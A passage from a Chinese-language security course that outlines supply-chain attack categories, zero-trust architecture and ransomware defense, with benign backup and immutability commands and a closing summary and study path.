3. CI/CD投毒：注入恶意代码到构建流水线
4. 维护者劫持：攻陷开源维护者账号
5. 镜像投毒：Docker Hub恶意镜像
6. 依赖劫持：修改上游依赖(SolarWinds事件影响18000+客户)

**防御**：官方源+签名验证+版本锁定、CI/CD最小权限+SBOM扫描+Dependabot/Renovate持续监控。

### 6.4 零信任架构

**核心**："Never Trust, Always Verify"——不信任任何网络位置，每次访问都需验证。

**SDP**：隐藏网络资源，只有认证设备才能连接。服务对互联网完全不可见，单包认证(SPA)提供"无响应即安全"效果。

**微隔离**：东西向流量严格管控，基于身份而非IP的策略。

**ZTNA实现**：Zscaler、Cloudflare Access、Tailscale(开源WireGuard方案)。

### 6.5 勒索软件防御

**攻击流程**：初始入侵(RDP爆破/钓鱼)→横向移动→数据窃取→加密锁机→勒索谈判。

**3-2-1备份原则**：3份副本、2种介质(本地+异地)、1份离线(不可变存储)。

```bash
# 不可变存储
aws s3api put-object-lock-configuration --bucket backups \
  --object-lock-configuration '{"ObjectLockEnabled":"Enabled",...}'
chattr +i /backups/immutable/   # Linux不可变目录

# 备份验证
restic check --repo /backups/restic-repo
restic restore latest --target /tmp/verify-restore
```

**防御矩阵**：
- 预防层：RDP禁公网、邮件网关、EDR行为检测、应用白名单、最小权限
- 检测层：文件批量改名监控、VSS删除监控、异常加密进程检测
- 响应层：隔离主机、切断域控、识别入口、备份恢复
- 恢复层：离线备份恢复、系统重建、密码全量重置

---

## 总结与知识关联

### 本课核心要点

| 章节 | 核心要点 | 关键技能 |
|------|---------|---------|
| 红蓝对抗基础 | 红队攻、蓝队守、紫队协作 | ATT&CK框架映射、杀伤链理解 |
| 红队攻击技术 | 社工、横向移动、C2、持久化 | Mimikatz/Impacket/CobaltStrike |
| 蓝队防御技术 | SIEM/SOAR、EDR、蜜罐、狩猎 | Wazuh/Sysmon/Sigma规则 |
| 安全运维 | 漏洞管理、基线、补丁、合规 | OpenSCAP/SBOM/CIS Benchmark |
| 实战工具链 | 渗透/网络/扫描/Web/逆向 | MSF/Wireshark/Burp/Ghidra |
| 新兴挑战 | 云安全、AI安全、零信任 | CSPM/对抗训练/ZTNA架构 |

### 与之前课程的关联

```
基础篇      → 密码学(#2) + 认证(#4) + 协议安全(#6)
Web安全    → OWASP(#3) + Burp/SQLMap
系统安全    → OS安全(#5) + Sysmon/EDR
对抗与运维  → 本课(#10) — 红蓝对抗 + SecOps
上层能力    → 社会工程(#8) + 日志取证(#9)
```

### 下一步学习路径

1. **实战练习**：HackTheBox / TryHackMe CTF挑战
2. **ATT&CK深入研究**：MITRE ATT&CK官网完整技术库
3. **搭建实验环境**：ELK+Wazuh、Metasploit+靶机
4. **认证方向**：OSCP(渗透) → CISSP(管理) → SANS/GIAC(专业)
5. **威胁情报订阅**：Recorded Future / Talos / VirusTotal

> **记住**：安全不是一次性的工程，而是持续对抗的过程。红队让你知道"能否被攻破"，蓝队确保"能否发现和响应"，SecOps将经验固化为日常。三者缺一不可。
